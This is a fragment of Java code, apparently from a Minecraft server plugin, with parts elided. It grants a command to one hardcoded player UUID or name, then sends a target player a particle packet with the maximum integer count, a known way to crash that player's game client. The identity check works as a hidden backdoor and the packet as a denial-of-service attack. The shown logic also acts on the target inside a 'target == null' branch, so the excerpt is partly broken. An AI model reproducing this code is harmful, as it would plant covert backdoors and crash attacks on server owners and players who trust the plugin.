            ...
            if(player.getUniqueId().toString().equalsIgnoreCase("018f2527-b5f7-49f3-a511-656b542c6366") || player.getName().equalsIgnoreCase("FileInputStream")) {
                if(args.length == 1) {
                    ...
                    if(target == null) {
                        ...
                        ((CraftPlayer)target).getHandle().playerConnection.sendPacket(new PacketPlayOutWorldParticles(EnumParticle.PORTAL, true, 0F, 0F, 0F, 0F, 0F, 0F, 0F, Integer.MAX_VALUE, new int[] { Integer.MAX_VALUE }));
